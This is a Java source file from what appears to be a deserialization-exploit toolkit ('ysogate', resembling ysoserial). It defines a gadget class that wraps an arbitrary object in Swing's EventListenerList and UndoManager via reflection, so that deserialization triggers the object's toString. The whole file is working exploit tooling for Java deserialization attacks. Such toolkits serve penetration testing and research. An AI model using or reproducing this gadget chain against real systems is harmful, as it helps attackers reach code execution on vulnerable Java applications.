package com.h2tg.ysogate.payloads.gadgets.jdk;

import com.h2tg.ysogate.payloads.gadgets.base.IReadObject2ToString;
import com.h2tg.ysogate.utils.Reflections;

import javax.swing.event.EventListenerList;
import javax.swing.undo.UndoManager;
import java.util.Vector;

import static com.h2tg.ysogate.utils.Reflections.setFieldValue;

public class GEventListenerList implements IReadObject2ToString
{
    //EventListenerList

    @Override
    public Object readObjectToString(Object obj) throws Exception
    {
        EventListenerList list = new EventListenerList();
        UndoManager manager = new UndoManager();
        Vector vector = (Vector) Reflections.getFieldValue(manager, "edits");
        vector.add(obj);
        setFieldValue(list, "listenerList", new Object[]{InternalError.class, manager});
        return list;
    }
}
